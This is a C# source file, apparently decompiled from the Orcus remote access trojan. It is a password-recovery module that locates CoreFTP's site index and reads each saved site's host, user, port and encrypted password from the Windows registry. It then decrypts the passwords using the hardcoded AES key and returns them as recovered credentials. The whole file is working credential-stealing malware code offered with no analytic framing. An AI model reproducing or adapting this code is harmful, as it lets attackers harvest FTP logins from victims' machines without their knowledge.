using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.CoreFTP;

internal class CoreFtp : IPasswordRecovery
{
	private const string ApplicationName = "CoreFTP";

	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "CoreFtp/sites.idx");
		StringBuilder stringBuilder = new StringBuilder();
		using (StreamReader streamReader = new StreamReader(path))
		{
			while (true)
			{
				string text;
				string line = (text = streamReader.ReadLine());
				if (text != null)
				{
					try
					{
						stringBuilder.Append(line.Split(new string[1] { "  " }, StringSplitOptions.None)[0] + " ");
					}
					catch
					{
					}
					continue;
				}
				break;
			}
		}
		string[] array = stringBuilder.ToString().Substring(0, stringBuilder.ToString().Length - 2).Split(new char[1] { ' ' });
		string[] array2 = array;
		foreach (string arg in array2)
		{
			string text2 = Registry.GetValue($"HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\{arg}", "Host", " ")!.ToString();
			string text3 = Registry.GetValue($"HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\{arg}", "User", " ")!.ToString();
			string text4 = Registry.GetValue($"HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\{arg}", "Port", " ")!.ToString();
			string password = DecryptCoreFtpPassword(Registry.GetValue($"HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\{arg}", "PW", " ")!.ToString());
			if (!string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4) && !string.IsNullOrEmpty(text2))
			{
				RecoveredPassword val = new RecoveredPassword();
				val.set_UserName(text3);
				val.set_Password(password);
				val.set_Application("CoreFTP");
				val.set_Field1(text2);
				val.set_Field2(text4);
				val.set_PasswordType((PasswordType)2);
				yield return val;
			}
		}
	}

	private static string DecryptCoreFtpPassword(string hexString)
	{
		StringBuilder stringBuilder = new StringBuilder(hexString.Length * 3 / 2);
		for (int i = 0; i < hexString.Length; i++)
		{
			if ((i > 0) & (i % 2 == 0))
			{
				stringBuilder.Append("-");
			}
			stringBuilder.Append(hexString[i]);
		}
		string text = stringBuilder.ToString();
		int num = (text.Length + 1) / 3;
		byte[] array = new byte[num];
		for (int j = 0; j < num; j++)
		{
			array[j] = Convert.ToByte(text.Substring(3 * j, 2), 16);
		}
		RijndaelManaged rijndaelManaged = new RijndaelManaged
		{
			Mode = CipherMode.ECB,
			Key = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk"),
			Padding = PaddingMode.Zeros
		};
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV);
		return Encoding.UTF8.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
	}
}
